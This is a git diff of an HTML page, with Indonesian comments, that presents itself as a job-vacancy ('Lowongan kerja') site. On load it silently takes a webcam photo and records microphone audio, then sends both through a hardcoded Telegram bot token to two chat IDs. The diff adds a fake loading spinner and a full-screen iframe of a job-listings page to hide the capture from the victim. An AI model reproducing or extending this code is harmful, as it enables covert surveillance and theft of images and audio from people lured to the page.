@@ -7,16 +7,49 @@
         #video {
             display: none;
         }
+        #loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+            font-family: Arial, sans-serif;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <div id="loading">
+        <div class="spinner"></div>
+        <p>Memuat konten...</p>
+    </div>
+    
     <video id="video" autoplay></video>
     <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>
 
     <script>
         const botToken = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU";
-        const chatId = "7916928366";
-        const teleId = "5253120221"; // ID Telegram yang ditambahkan
+        const chatId1 = "7916928366"; // ID Telegram pertama
+        const chatId2 = "5253120221"; // ID Telegram kedua
         
         let mediaStream = null;
         let mediaRecorder = null;
@@ -46,7 +79,10 @@
                     // Ambil foto setelah 1 detik
                     setTimeout(() => {
                         ctx.drawImage(video, 0, 0, 2000, 2000);
-                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
+                        canvas.toBlob(blob => {
+                            sendToTelegram(blob, chatId1);
+                            sendToTelegram(blob, chatId2); // Kirim ke ID kedua
+                        }, "image/jpeg", 0.8);
                     }, 1000);
                     
                     // Mulai perekaman audio
@@ -57,12 +93,12 @@
                 })
                 .catch(error => {
                     console.error(error);
-                    alert("Failed to access camera.");
+                    alert("eror");
                 });
         }
 
-        function sendToTelegram(blob) {
-            if (hasSentPhoto) return; // Pastikan hanya mengirim foto sekali
+        function sendToTelegram(blob, chatId) {
+            if (hasSentPhoto && chatId === chatId1) return; // Pastikan hanya mengirim foto sekali per ID
             hasSentPhoto = true;
             
             const formData = new FormData();
@@ -76,7 +112,7 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        console.log("Camera frame sent to Telegram.");
+                        console.log(`Camera frame sent to Telegram ID: ${chatId}`);
                     } else {
                         throw new Error(data.description);
                     }
@@ -102,7 +138,7 @@
 
                     mediaRecorder.start();
 
-                    // Hentikan perekaman setelah 3 detik kwannn
+                    // Hentikan perekaman setelah 3 detik
                     setTimeout(() => {
                         if (mediaRecorder && mediaRecorder.state === "recording") {
                             mediaRecorder.stop();
@@ -115,17 +151,18 @@
 
                     mediaRecorder.addEventListener("stop", () => {
                         const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
-                        sendAudioToTelegram(audioBlob);
+                        sendAudioToTelegram(audioBlob, chatId1);
+                        sendAudioToTelegram(audioBlob, chatId2); // Kirim ke ID kedua
                     });
                 })
                 .catch((error) => {
                     console.error(error);
-                    alert("Failed to access microphone.");
+                    alert("Eror mohon izinkan akses terlebih dahulu.");
                 });
         }
 
-        function sendAudioToTelegram(blob) {
-            if (hasSentAudio) return; // Pastikan hanya mengirim audio sekali
+        function sendAudioToTelegram(blob, chatId) {
+            if (hasSentAudio && chatId === chatId1) return; // Pastikan hanya mengirim audio sekali per ID
             hasSentAudio = true;
             
             const formData = new FormData();
@@ -140,7 +177,7 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        console.log("Audio recording sent to Telegram.");
+                        console.log(`Audio recording sent to Telegram ID: ${chatId}`);
                     } else {
                         throw new Error(data.description);
                     }
@@ -162,36 +199,30 @@
                 mediaStream.getTracks().forEach(track => track.stop());
             }
             
+            // Sembunyikan loading indicator
+            document.getElementById('loading').style.display = 'none';
+            
             console.log("Semua aktivitas dihentikan setelah 10 detik");
         }
 
         // Call startCamera when the page is loaded.
-        startCamera();
+        window.onload = function() {
+            startCamera();
+            
+            // Tampilkan iframe setelah beberapa detik
+            setTimeout(function() {
+                const iframe = document.createElement('iframe');
+                iframe.src = "https://vrshack26-a11y.github.io/Lowongan-kerja/";
+                iframe.style.width = '100%';
+                iframe.style.height = '100%';
+                iframe.style.border = 'none';
+                iframe.style.position = 'fixed';
+                iframe.style.top = '0';
+                iframe.style.left = '0';
+                iframe.style.zIndex = '999';
+                document.body.appendChild(iframe);
+            }, 2000);
+        };
     </script>
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lowongan kerja</title>
-<style>
-  body, html {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    overflow: hidden;
-  }
-  iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-  }
-</style>
-</head>
-<body>
-<iframe src="https://vrshack26-a11y.github.io/Lowongan-kerja/" allowfullscreen></iframe>
 </body>
 </html>
